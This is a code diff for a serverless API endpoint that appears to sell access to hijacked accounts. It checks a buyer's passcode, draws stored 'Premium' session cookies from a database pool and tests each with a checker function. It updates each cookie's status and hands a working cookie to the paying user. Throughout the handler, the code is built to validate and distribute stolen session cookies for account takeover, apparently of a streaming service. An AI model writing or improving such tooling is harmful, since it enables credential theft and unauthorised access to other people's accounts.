@@ -1,4 +1,4 @@
-// api/find-account.ts – FULL SCRIPT WITH ONLY 2 CHANGES
+// api/find-account.ts – FINAL PRODUCTION READY
 import type { VercelRequest, VercelResponse } from "@vercel/node";
 import { ipRateLimit } from "../lib/rateLimit.js";
 import {
@@ -26,33 +26,30 @@ const originalServerHelpers = require("./original_server_helpers.cjs");
 const { getCookieHeaders, runDirectCheck } =
   originalServerHelpers.default ?? originalServerHelpers;
 
+// ============ UTILITY FUNCTIONS ============
+
 function getClientIp(req: VercelRequest) {
   const xff = req.headers["x-forwarded-for"];
-
   if (typeof xff === "string" && xff.length > 0) {
     return xff.split(",")[0].trim();
   }
-
   const realIp = req.headers["x-real-ip"];
-
   if (typeof realIp === "string" && realIp.length > 0) {
     return realIp.trim();
   }
-
   return "unknown";
 }
 
 function getAccessToken(req: VercelRequest) {
   const authorization = req.headers.authorization;
-
   const headerValue = Array.isArray(authorization)
     ? authorization[0]
     : authorization || "";
-
   const match = headerValue.match(/^Bearer\s+(.+)$/i);
-
   return match?.[1]?.trim() || "";
 }
+
+// ============ PASSCODE VALIDATION ============
 
 type PasscodeCheck =
   | {
@@ -73,9 +70,7 @@ async function isPasscodeValid(
 ): Promise<PasscodeCheck> {
   const { data, error } = await supabase
     .from("passcodes")
-    .select(
-      "id, code, user_id, is_active, expires_at, uses, max_uses"
-    )
+    .select("id, code, user_id, is_active, expires_at, uses, max_uses")
     .eq("code", passcode)
     .eq("user_id", userId)
     .eq("is_active", true)
@@ -87,17 +82,11 @@ async function isPasscodeValid(
   }
 
   if (!data) {
-    return {
-      ok: false,
-      error: "Incorrect passcode.",
-    };
+    return { ok: false, error: "Incorrect passcode." };
   }
 
   if (data.expires_at && new Date(data.expires_at) <= new Date()) {
-    return {
-      ok: false,
-      error: "This passcode has expired.",
-    };
+    return { ok: false, error: "This passcode has expired." };
   }
 
   if (
@@ -105,18 +94,12 @@ async function isPasscodeValid(
     typeof data.uses === "number" &&
     data.uses >= data.max_uses
   ) {
-    return {
-      ok: false,
-      error: "Usage limit reached.",
-    };
+    return { ok: false, error: "Usage limit reached." };
   }
 
   return {
     ok: true,
-    passcodeRow: {
-      id: data.id,
-      uses: data.uses ?? 0,
-    },
+    passcodeRow: { id: data.id, uses: data.uses ?? 0 },
   };
 }
 
@@ -126,19 +109,17 @@ async function incrementPasscodeUsage(
 ) {
   const { error } = await supabase
     .from("passcodes")
-    .update({
-      uses: (currentUses ?? 0) + 1,
-    })
+    .update({ uses: (currentUses ?? 0) + 1 })
     .eq("id", passcodeId);
-
   if (error) {
     console.error("incrementPasscodeUsage error:", error.message);
   }
 }
 
+// ============ DATABASE FUNCTIONS ============
+
 async function savePassedCheckAudits(results: any[]) {
   const passed = (results || []).filter((result) => result?.valid);
-
   if (!passed.length) return;
 
   const rows = passed.map((item) => ({
@@ -148,17 +129,43 @@ async function savePassedCheckAudits(results: any[]) {
   }));
 
   const { error } = await supabase.from("live_checks").insert(rows);
-
   if (error) {
     console.error("savePassedCheckAudits error:", error.message);
   }
 }
 
+async function updateCookieStatus(cookieId: string, isValid: boolean, plan?: string, country?: string) {
+  const updateData: any = {
+    status: isValid ? 'active' : 'expired',
+    checked_at: new Date().toISOString(),
+  };
+  
+  if (plan) updateData.plan = plan;
+  if (country) updateData.country = country;
+  
+  const { error } = await supabase
+    .from("checked_cookies")
+    .update(updateData)
+    .eq("id", cookieId);
+
+  if (error) {
+    console.error(`Failed to update cookie ${cookieId}:`, error.message);
+  } else {
+    console.log(`Updated cookie ${cookieId} status to ${updateData.status}`);
+  }
+}
+
+// ============ MAIN HANDLER ============
+
 export default async function handler(
   req: VercelRequest,
   res: VercelResponse
 ) {
+  const startTime = Date.now();
+  console.log("🚀 find-account API called");
+
   try {
+    // 1. METHOD CHECK
     if (req.method !== "POST") {
       return res.status(405).json({
         success: false,
@@ -166,14 +173,15 @@ export default async function handler(
       });
     }
 
+    // 2. IP RATE LIMITING
     const ip = getClientIp(req);
+    console.log(`📡 Request from IP: ${ip}`);
 
-    const { success } = await ipRateLimit.limit(ip);
-
-    if (!success) {
+    const { success: rateLimitSuccess } = await ipRateLimit.limit(ip);
+    if (!rateLimitSuccess) {
       return res.status(429).json({
         success: false,
-        error: "Too many requests. Try again later.",
+        error: "Too many requests. Please slow down.",
       });
     }
 
@@ -184,9 +192,8 @@ export default async function handler(
       });
     }
 
-    // Verify the currently signed-in Supabase user
+    // 3. AUTH CHECK
     const accessToken = getAccessToken(req);
-
     if (!accessToken) {
       return res.status(401).json({
         success: false,
@@ -205,130 +212,167 @@ export default async function handler(
         error: "Invalid or expired login session.",
       });
     }
+    console.log(`👤 User authenticated: ${user.email}`);
 
-    const passcode = String(req.body?.passcode ?? "")
-      .trim()
-      
+    // 4. PASSCODE CHECK
+    const passcode = String(req.body?.passcode ?? "").trim();
     if (!passcode) {
       await recordFailure(ip);
-
       return res.status(400).json({
         success: false,
         error: "Passcode is required.",
       });
     }
 
-    // The passcode must belong to the signed-in purchaser
-    const passcodeCheck = await isPasscodeValid(
-      passcode,
-      user.id
-    );
-
+    const passcodeCheck = await isPasscodeValid(passcode, user.id);
     if (!passcodeCheck.ok) {
       await recordFailure(ip);
-
       return res.status(401).json({
         success: false,
         error: passcodeCheck.error,
       });
     }
+    console.log("✅ Passcode validated");
 
-  // ✅ CORRECT – Use the 'text' column (or whatever column actually has cookies)
-const { data: cookieRows, error: cookieError } = await supabase
-  .from("checked_cookies")
-  .select("text")  // ← Use 'text' column, NOT 'cookie_header'!
-  .eq("plan", "Premium")
-  .neq("status", "expired")
-  .not("text", "is", null)
-  .not("text", "eq", "")
-  .order("checked_at", { ascending: true, nullsFirst: true })
-  .limit(50);
+    // 5. FETCH PREMIUM COOKIES – BULLETPROOF QUERY
+    console.log("🔍 Fetching Premium cookies from checked_cookies...");
     
-    if (cookieError) {
-      console.error("Cookie pool lookup error:", cookieError);
+    const { data: cookieRows, error: cookieError } = await supabase
+      .from("checked_cookies")
+      .select("id, cookie_header, plan, country, status")
+      .eq("plan", "Premium")
+      .not("cookie_header", "is", null)
+      .not("cookie_header", "eq", "")
+      .limit(50);
 
+    if (cookieError) {
+      console.error("❌ Cookie pool lookup error:", cookieError);
       return res.status(500).json({
         success: false,
         error: "Unable to load the available account pool.",
+        details: cookieError.message,
       });
     }
 
-    const storedCookies = (cookieRows ?? [])
-      .map((row: any) => row.cookie)
-      .filter(Boolean);
+    console.log(`✅ Found ${cookieRows?.length || 0} Premium cookies`);
 
-    if (!storedCookies.length) {
+    // 6. EXTRACT COOKIES FROM cookie_header COLUMN
+    const cookiesWithIds = (cookieRows ?? [])
+      .map((row: any) => ({
+        id: row.id,
+        cookie: row.cookie_header,
+        plan: row.plan,
+        country: row.country,
+        status: row.status,
+      }))
+      .filter((item: any) => item.cookie && item.cookie.length > 10);
+
+    if (!cookiesWithIds.length) {
+      console.log("❌ No valid cookie strings found");
       return res.status(400).json({
         success: false,
-        error: "Cookie pool is empty. No Premium cookies available yet.",
+        error: "No Premium cookies available in the pool.",
+        debug: {
+          rowsReturned: cookieRows?.length || 0,
+          columnUsed: "cookie_header",
+        },
       });
     }
 
-    const parsedInput = getCookieHeaders({
-      input: storedCookies.join("\n"),
-    });
+    console.log(`📦 Extracted ${cookiesWithIds.length} cookies for checking`);
 
-    if (parsedInput.error) {
-      return res.status(400).json({
-        success: false,
-        error: parsedInput.error,
-      });
+    // Log sample for debugging
+    if (cookiesWithIds.length > 0) {
+      console.log(`📋 Sample: ${cookiesWithIds[0].cookie.substring(0, 80)}...`);
     }
 
-    const cookies = parsedInput.cookies;
-
-    if (!Array.isArray(cookies) || !cookies.length) {
-      return res.status(400).json({
-        success: false,
-        error: "No valid cookies found in the pool.",
-      });
-    }
-
-    for (let i = cookies.length - 1; i > 0; i--) {
+    // 7. SHUFFLE COOKIES FOR RANDOMNESS
+    for (let i = cookiesWithIds.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
-
-      [cookies[i], cookies[j]] = [cookies[j], cookies[i]];
+      [cookiesWithIds[i], cookiesWithIds[j]] = [cookiesWithIds[j], cookiesWithIds[i]];
     }
 
-    for (const cookie of cookies) {
-      const result = await runDirectCheck([cookie], 1, {
-        skipNFToken: false,
-        delayMs: 0,
-        randomJitter: false,
-        staggerMs: 0,
-        onValidCookie: async () => {},
-      });
+    // 8. CHECK COOKIES ONE BY ONE
+    let checkedCount = 0;
+    let foundValid = false;
 
-      const results = Array.isArray(result?.results)
-        ? result.results
-        : [];
+    for (const item of cookiesWithIds) {
+      checkedCount++;
+      console.log(`🔍 Checking cookie ${checkedCount}/${cookiesWithIds.length} (ID: ${item.id})`);
 
-      await savePassedCheckAudits(results);
+      try {
+        const cookieArray = [item.cookie];
+        
+        const result = await runDirectCheck(cookieArray, 1, {
+          skipNFToken: false,
+          delayMs: 0,
+          randomJitter: false,
+          staggerMs: 0,
+          onValidCookie: async () => {},
+        });
 
-      const valid = results.find((item: any) => item?.valid);
+        const results = Array.isArray(result?.results) ? result.results : [];
+        const valid = results.find((r: any) => r?.valid);
 
-      if (valid) {
-        await incrementPasscodeUsage(
-          passcodeCheck.passcodeRow.id,
-          passcodeCheck.passcodeRow.uses
+        // Update cookie status in database
+        await updateCookieStatus(
+          item.id,
+          !!valid,
+          valid?.plan || item.plan || 'Premium',
+          valid?.countryOfSignup || item.country || null
         );
 
-        await clearFailures(ip);
-
-        return res.status(200).json(result);
+        if (valid) {
+          await savePassedCheckAudits(results);
+          console.log(`✅ VALID cookie found!`);
+          foundValid = true;
+          
+          await incrementPasscodeUsage(
+            passcodeCheck.passcodeRow.id,
+            passcodeCheck.passcodeRow.uses
+          );
+          await clearFailures(ip);
+          
+          const responseTime = Date.now() - startTime;
+          console.log(`⏱️ Response time: ${responseTime}ms`);
+          
+          return res.status(200).json({
+            success: true,
+            ...result,
+            debug: {
+              totalCookiesChecked: checkedCount,
+              responseTime: `${responseTime}ms`,
+              cookieId: item.id,
+            },
+          });
+        } else {
+          console.log(`❌ Cookie ${checkedCount} invalid or expired`);
+        }
+      } catch (checkError: any) {
+        console.error(`⚠️ Error checking cookie ${item.id}:`, checkError.message);
+        // Mark as expired on error
+        await updateCookieStatus(item.id, false, item.plan || 'Premium', item.country || null);
       }
     }
 
+    // 9. NO VALID COOKIES FOUND
+    console.log(`❌ No valid Premium cookies found after checking ${checkedCount} cookies`);
+    
     return res.status(404).json({
       success: false,
-      error: "No valid Premium account found from available cookies.",
+      error: "No valid Premium accounts found. All checked cookies are expired or invalid.",
+      debug: {
+        totalChecked: checkedCount,
+        totalAvailable: cookiesWithIds.length,
+      },
     });
-  } catch (error: any) {
-    console.error("find-account crash:", error);
 
+  } catch (error: any) {
+    console.error("💥 find-account crash:", error);
     return res.status(500).json({
       success: false,
       error: error?.message || "Unexpected server error",
+      debug: process.env.NODE_ENV === 'development' ? { stack: error?.stack } : undefined,
     });
   }
 }
